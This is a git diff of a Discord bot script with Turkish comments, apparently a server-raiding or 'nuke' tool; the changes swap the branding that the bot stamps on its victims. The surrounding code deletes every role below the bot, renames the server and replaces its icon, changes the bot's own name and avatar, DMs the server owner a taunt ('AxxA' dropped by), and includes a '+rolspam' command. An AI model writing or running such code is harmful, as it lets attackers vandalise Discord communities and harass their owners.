@@ -1249,17 +1249,15 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
     
-    await msg.guild.setIcon("https://media.discordapp.net/attachments/868048636456603692/868050442112876594/Forest_1.jpg?width=960&height=600");  //SUNUCUNUN RESMINI DEGISTIRIR HIZI RESIM SUTESINDEN UPLOAD EDEBILIRSINIZ
-    await msg.guild.setName("AxxA Ayak Bastı"); //SUNUCUNUN ISMINI DEGISTIRIR
+    await msg.guild.setIcon("https://cdn.discordapp.com/attachments/842122302351343626/868185516976255016/20210723_203859.jpg");  //SUNUCUNUN RESMINI DEGISTIRIR HIZI RESIM SUTESINDEN UPLOAD EDEBILIRSINIZ
+    await msg.guild.setName("AxxA"); //SUNUCUNUN ISMINI DEGISTIRIR
     await msg.guild.roles.forEach(roles => roles.delete()); //BOTUN SIZE BILDIGI BÜTÜN ROLLER SILINIR (BOTUN ROLUNUN ALTINDAKILER) 
-    await client.user.setAvatar("https://media.discordapp.net/attachments/868048636456603692/868050442112876594/Forest_1.jpg?width=960&height=600"); //BOTUN RESMINI DEGISTIRIR HIZLI RESIM SITESINDEN UPLOAD EDEBILIRSINIZ
-    await client.user.setUsername("Vortex.");    //BOTUN ISMİNİ DEGISTIRIR
-    await msg.guild.owner.send("**Sunucuna Uğradım AxxA'dan Heyyo**");    //SUNUCUNUN KURUCUSUNA DMDEN GÖNDERİLEN MESAJ
+    await client.user.setAvatar("https://cdn.discordapp.com/attachments/842122302351343626/868185516976255016/20210723_203859.jpg"); //BOTUN RESMINI DEGISTIRIR HIZLI RESIM SITESINDEN UPLOAD EDEBILIRSINIZ
+    await client.user.setUsername("Made By AxxA");    //BOTUN ISMİNİ DEGISTIRIR
+    await msg.guild.owner.send("**Sunucuna Uğradım AxxA'dan İleti.**");    //SUNUCUNUN KURUCUSUNA DMDEN GÖNDERİLEN MESAJ
     
-  }   ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
+  }   
 });
-
- //www.youtube.com/ENESACARYT TARAFINDAN YAPILMISTIR
 
     client.on("message", msg => {
   if (msg.content === "+rolspam") {  //ROL SPAM YAPAR
